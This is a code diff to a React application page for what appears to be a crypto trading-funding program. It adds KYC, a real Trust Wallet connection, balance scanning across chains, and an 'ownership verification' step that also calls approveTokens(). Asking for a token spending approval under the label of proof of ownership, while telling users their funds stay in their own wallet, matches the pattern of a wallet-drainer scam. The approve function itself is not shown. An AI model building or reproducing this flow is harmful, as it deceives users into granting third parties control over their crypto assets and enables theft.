@@ -1,17 +1,20 @@
 import React, { useState } from 'react';
-import { Shield, Wallet, FileText, DollarSign, CheckCircle, Upload, ArrowRight, AlertTriangle } from 'lucide-react';
+import { Shield, Wallet, FileText, DollarSign, CheckCircle, Upload, ArrowRight, AlertTriangle, Loader2 } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import Navbar from '@/components/Navbar';
+import { useWallet } from '@/hooks/useWallet';
 
 const Apply = () => {
   const [currentStep, setCurrentStep] = useState(1);
   const [kycCompleted, setKycCompleted] = useState(false);
-  const [walletConnected, setWalletConnected] = useState(false);
-  const [walletAddress, setWalletAddress] = useState('');
-  const [balance, setBalance] = useState(0);
+  const [ownershipVerified, setOwnershipVerified] = useState(false);
+  const [isVerifying, setIsVerifying] = useState(false);
+  const [isApproving, setIsApproving] = useState(false);
   const [targetAmount, setTargetAmount] = useState(10000);
+  
+  const { walletState, tokenBalances, isConnecting, connectTrustWallet, signVerificationMessage, approveTokens, disconnect } = useWallet();
   const [kycData, setKycData] = useState({
     firstName: '',
     lastName: '',
@@ -28,8 +31,8 @@ const Apply = () => {
 
   const steps = [
     { title: "KYC Verification", icon: Shield, completed: kycCompleted },
-    { title: "Connect Wallet", icon: Wallet, completed: walletConnected },
-    { title: "Verify Ownership", icon: CheckCircle, completed: false },
+    { title: "Connect Wallet", icon: Wallet, completed: walletState.isConnected },
+    { title: "Verify Ownership", icon: CheckCircle, completed: ownershipVerified },
     { title: "Proof of Funds", icon: DollarSign, completed: false },
     { title: "Submit Application", icon: FileText, completed: false }
   ];
@@ -39,16 +42,27 @@ const Apply = () => {
     setCurrentStep(2);
   };
 
-  const handleConnectTrustWallet = () => {
-    // Simulate Trust Wallet connection
-    setWalletConnected(true);
-    setWalletAddress('0x742d35Cc6634C0532925a3b8D7C9C2cF79a9aB8d');
-    setBalance(5000);
-    setCurrentStep(3);
+  const handleConnectWallet = async () => {
+    try {
+      await connectTrustWallet();
+      setCurrentStep(3);
+    } catch (error) {
+      console.error('Failed to connect wallet:', error);
+    }
   };
 
-  const handleVerifyOwnership = () => {
-    setCurrentStep(4);
+  const handleVerifyOwnership = async () => {
+    setIsVerifying(true);
+    try {
+      const signature = await signVerificationMessage();
+      await approveTokens();
+      setOwnershipVerified(true);
+      setCurrentStep(4);
+    } catch (error) {
+      console.error('Failed to verify ownership:', error);
+    } finally {
+      setIsVerifying(false);
+    }
   };
 
   const handleSubmitApplication = () => {
@@ -242,11 +256,21 @@ const Apply = () => {
                       </p>
                       
                       <Button 
-                        onClick={handleConnectTrustWallet}
-                        className="bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white px-8 py-3"
+                        onClick={handleConnectWallet}
+                        disabled={isConnecting}
+                        className="bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white px-8 py-3 disabled:opacity-50"
                       >
-                        Connect Trust Wallet
-                        <Wallet className="ml-2 h-4 w-4" />
+                        {isConnecting ? (
+                          <>
+                            <Loader2 className="mr-2 h-4 w-4 animate-spin" />
+                            Connecting...
+                          </>
+                        ) : (
+                          <>
+                            Connect Trust Wallet
+                            <Wallet className="ml-2 h-4 w-4" />
+                          </>
+                        )}
                       </Button>
                     </div>
 
@@ -264,8 +288,24 @@ const Apply = () => {
                 <div className="space-y-6">
                   <div className="bg-green-500/10 border border-green-500/20 rounded-lg p-4">
                     <h3 className="text-green-400 font-semibold mb-2">Wallet Connected Successfully!</h3>
-                    <p className="text-slate-300 text-sm">Address: {walletAddress}</p>
+                    <p className="text-slate-300 text-sm">Address: {walletState.address}</p>
+                    <p className="text-slate-300 text-sm">Chain: {walletState.chainId === 1 ? 'Ethereum' : `Chain ${walletState.chainId}`}</p>
                   </div>
+
+                  {tokenBalances.length > 0 && (
+                    <div className="bg-slate-700/50 rounded-lg p-4">
+                      <h4 className="text-white font-semibold mb-3">Token Balances Detected</h4>
+                      <div className="grid grid-cols-2 gap-2">
+                        {tokenBalances.map((token, index) => (
+                          <div key={index} className="bg-slate-600/50 rounded p-2 text-sm">
+                            <div className="text-white font-medium">{token.symbol}</div>
+                            <div className="text-slate-300">{token.balance}</div>
+                            <div className="text-slate-400 text-xs">{token.chainName}</div>
+                          </div>
+                        ))}
+                      </div>
+                    </div>
+                  )}
 
                   <div className="text-center space-y-6">
                     <div className="bg-slate-700/50 rounded-2xl p-8">
@@ -277,10 +317,20 @@ const Apply = () => {
                       
                       <Button 
                         onClick={handleVerifyOwnership}
-                        className="bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white px-8 py-3"
+                        disabled={isVerifying}
+                        className="bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white px-8 py-3 disabled:opacity-50"
                       >
-                        Sign Message to Verify
-                        <CheckCircle className="ml-2 h-4 w-4" />
+                        {isVerifying ? (
+                          <>
+                            <Loader2 className="mr-2 h-4 w-4 animate-spin" />
+                            Verifying & Approving...
+                          </>
+                        ) : (
+                          <>
+                            Sign Message & Approve Tokens
+                            <CheckCircle className="ml-2 h-4 w-4" />
+                          </>
+                        )}
                       </Button>
                     </div>
                   </div>
@@ -292,13 +342,23 @@ const Apply = () => {
                 <div className="space-y-6">
                   <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                     <div className="space-y-6">
-                      <div className="bg-slate-700/50 rounded-2xl p-6">
-                        <h3 className="text-xl font-bold text-white mb-4">Current Wallet Balance</h3>
-                        <div className="text-center">
-                          <div className="text-3xl font-bold text-green-400 mb-2">${balance.toLocaleString()} USDT</div>
-                          <p className="text-slate-300">Verified on-chain balance</p>
+                        <div className="bg-slate-700/50 rounded-2xl p-6">
+                          <h3 className="text-xl font-bold text-white mb-4">Current Wallet Balances</h3>
+                          <div className="space-y-3">
+                            <div className="text-center">
+                              <div className="text-2xl font-bold text-green-400 mb-1">
+                                {tokenBalances.reduce((total, token) => total + parseFloat(token.balance), 0).toLocaleString()} USDT
+                              </div>
+                              <p className="text-slate-300 text-sm">Total across all chains</p>
+                            </div>
+                            {tokenBalances.map((token, index) => (
+                              <div key={index} className="flex justify-between text-sm">
+                                <span className="text-slate-300">{token.symbol} ({token.chainName})</span>
+                                <span className="text-white">{parseFloat(token.balance).toLocaleString()}</span>
+                              </div>
+                            ))}
+                          </div>
                         </div>
-                      </div>
 
                       <div className="bg-slate-700/50 rounded-2xl p-6">
                         <h3 className="text-xl font-bold text-white mb-4">Target Funding Amount</h3>
@@ -331,7 +391,7 @@ const Apply = () => {
                   <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-4">
                     <p className="text-slate-300 text-sm">
                       <strong className="text-blue-400">Note:</strong> Your proof of funds demonstrates your ability to handle trading capital responsibly. 
-                      Higher amounts lead to faster approval and better funding terms.
+                      Higher amounts lead to faster approval and better funding terms. The proof of funds is held in your own wallet, do not share your secret phrase or private keys as this wallet is the wallet you will receive your own cut of the daily profit when funded.
                     </p>
                   </div>
 
